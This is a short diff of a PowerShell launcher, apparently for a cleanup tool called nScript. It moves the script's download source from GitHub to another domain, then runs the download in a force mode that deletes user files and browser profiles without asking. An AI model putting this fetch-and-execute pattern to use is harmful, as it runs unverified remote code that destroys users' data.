@@ -6,7 +6,7 @@ $RunPath = Join-Path (Join-Path $env:USERPROFILE '.nScript') ([guid]::NewGuid().
 New-Item -ItemType Directory -Path $RunPath -Force | Out-Null
 try {
     $ScriptPath = Join-Path $RunPath 'nScript.ps1'
-    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nyxiereal/nScript/dist/nScript.ps1' -OutFile $ScriptPath -UseBasicParsing
+    Invoke-WebRequest -Uri 'https://clean.meowery.eu/nScript.ps1' -OutFile $ScriptPath -UseBasicParsing
     if ((Get-Item -LiteralPath $ScriptPath).Length -eq 0) { throw 'nScript download is empty.' }
     Write-Host '[!] FORCE MODE: deletes user files and browser profiles without asking.'
     & powershell.exe -NoProfile -File $ScriptPath -Force
